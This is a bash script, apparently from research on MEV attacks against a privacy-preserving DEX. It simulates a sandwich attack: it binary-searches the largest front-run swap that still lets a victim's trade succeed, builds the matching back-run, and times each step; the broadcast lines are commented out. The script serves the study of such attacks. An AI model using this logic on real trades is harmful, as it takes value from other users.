#!/bin/bash
set -e

source ./scripts/mev_utils.sh

CONTRACT_ADDRESS=`cat $CONTRACT_LOC/contractAddress.txt`
CODE_HASH=`cat $CONTRACT_LOC/codeHash.txt`

set_snapshot "${UNIQUE_LABEL}-start"

query_balances
echo "pool_a $(query_pool pool_a)"
echo "pool_a $(query_pool pool_b)"

# make victim tx
generate_and_sign_swap token_a 10 20 $VICTIM victim
echo "victim tx amount of token A = 10, expected return = 20"
echo

# use the nano benchmark logs to measure the loop only
#rm -f /tmp/ecall_init_nanos.log
rm -f /tmp/ecall_handle_nanos.log
rm -f /tmp/ecall_query_nanos.log
#touch /tmp/ecall_init_nanos.log
touch /tmp/ecall_query_nanos.log

start_time=$(date +%s%N)
cnt=0
lo=0
hi=100
while [ $(expr $hi - $lo) -ne 1 ]; do
  ###
  start_loop=$(date +%s%N)
  ###
  ###
  start=$(date +%s%N)
  ###

  set_snapshot "${UNIQUE_LABEL}-${cnt}"
  ###
  end=$(date +%s%N)
  time_diff=$(echo "($end - $start)/1000000" | bc)
  echo "-----------------------------------------------------------set_snapshot: $time_diff ms"
  ###

  mid=$((($hi + $lo) / 2))
  echo "lo:$lo hi:$hi mid:$mid"

  ###
  start=$(date +%s%N)
  ###
  generate_and_sign_swap token_a $mid 0 $ADV adv
  ###
  end=$(date +%s%N)
  time_diff=$(echo "($end - $start)/1000000" | bc)
  echo "-----------------------------------------------------------generate and sign adversary transaction: $time_diff ms"
  ###
  echo "adv tx token_a $mid 0"

  ###
  start=$(date +%s%N)
  ###
  simulate_tx adv
  ###
  end=$(date +%s%N)
  time_diff=$(echo "($end - $start)/1000000" | bc)
  echo "-----------------------------------------------------------simulate adversary transaction: $time_diff ms"
  ###
  ###
  start=$(date +%s%N)
  ###
  old_pool_a=$(query_pool pool_a)
  ###
  end=$(date +%s%N)
  time_diff=$(echo "($end - $start)/1000000" | bc)
  echo "-----------------------------------------------------------query old pool: $time_diff ms"
  ###
  ###
  start=$(date +%s%N)
  ###
  simulate_tx victim
  ###
  end=$(date +%s%N)
  time_diff=$(echo "($end - $start)/1000000" | bc)
  echo "-----------------------------------------------------------simulate victim transaction: $time_diff ms"
  ###
  ###
  start=$(date +%s%N)
  ###
  new_pool_a=$(query_pool pool_a)
  ###
  end=$(date +%s%N)
  time_diff=$(echo "($end - $start)/1000000" | bc)
  echo "-----------------------------------------------------------query new pool: $time_diff ms"
  ###
  dif_pool_a=$(($new_pool_a - $old_pool_a))
  echo 'dif' $dif_pool_a

  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
  cnt=$((cnt + 1))

  ###
  end_loop=$(date +%s%N)
  time_diff=$(echo "($end_loop - $start_loop)/1000000" | bc)
  echo "-----------------------------------------------------------single loop: $time_diff ms"
  ###

  echo "=================================== end of a trial"
  echo
done

end_time=$(date +%s%N)

#ecall_init_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_init_nanos.log)
#ecall_init_time_millis=$( echo "$ecall_init_time_nanos / 1000000" | bc)
ecall_handle_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_handle_nanos.log)
ecall_handle_time_millis=$( echo "$ecall_handle_time_nanos / 1000000" | bc)
ecall_query_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_query_nanos.log)
ecall_query_time_millis=$( echo "$ecall_query_time_nanos / 1000000" | bc)
#ecalls_total_time_nanos=$( echo "$ecall_init_time_nanos + $ecall_handle_time_nanos + $ecall_query_time_nanos" | bc)
ecalls_total_time_nanos=$( echo "$ecall_handle_time_nanos + $ecall_query_time_nanos" | bc)
ecalls_total_time_millis=$( echo "$ecalls_total_time_nanos / 1000000" | bc)

total_time_nanos=$(echo "$end_time - $start_time" | bc)
total_time_millis=$(echo "$total_time_nanos / 1000000" | bc)

untrusted_time_nanos=$(echo "$total_time_nanos - $ecalls_total_time_nanos" | bc)
untrusted_time_millis=$(echo "$total_time_millis - $ecalls_total_time_millis" | bc)

printf "\nTotal time spent for trial: ${total_time_nanos} nanosecs"
#printf "\nEstimated time spent for (trusted) ecall_init ${ecall_init_time_nanos} nanosecs"
printf "\nEstimated time spent for (trusted) ecall_handle ${ecall_handle_time_nanos} nanosecs"
printf "\nEstimated time spent for (trusted) ecall_query ${ecall_query_time_nanos} nanosecs"
printf "\nEstimated time spent for (trusted) ecalls (handle & query) ${ecalls_total_time_nanos} nanosecs"
printf "\nEstimated time spent for untrusted code ${untrusted_time_nanos} nanosecs\n"

printf "\nTotal time spent for trial: ${total_time_millis} millisecs"
#printf "\nEstimated time spent for (trusted) ecall_init ${ecall_init_time_millis} millisecs"
printf "\nEstimated time spent for (trusted) ecall_handle ${ecall_handle_time_millis} millisecs"
printf "\nEstimated time spent for (trusted) ecall_query ${ecall_query_time_millis} millisecs"
printf "\nEstimated time spent for (trusted) ecalls (handle & query) ${ecalls_total_time_millis} millisecs"
printf "\nEstimated time spent for untrusted code ${untrusted_time_millis} millisecs\n\n"

set_snapshot "${UNIQUE_LABEL}-${cnt}"
echo "final front-run tx token_a $lo 0"
old_pool_b=$(query_pool pool_b)
simulate_tx adv
new_pool_b=$(query_pool pool_b)
dif_pool_b=$(($old_pool_b - $new_pool_b))
generate_and_sign_swap token_b $dif_pool_b 0 $ADV adv_back
echo "final back-run tx token_b $dif_pool_b 0"

echo
# broadcast all 3 txs
set_snapshot "${UNIQUE_LABEL}-final"
simulate_tx adv
simulate_tx victim
simulate_tx adv_back

## broadcast all 3 txs
#reset_snapshot
#broadcast_tx adv
#broadcast_tx victim
## send back-run tx
#execute_tx token_b $dif_pool_b 0 $ADV
#query_balances

query_balances
echo "pool_a $(query_pool pool_a)"
echo "pool_a $(query_pool pool_b)"
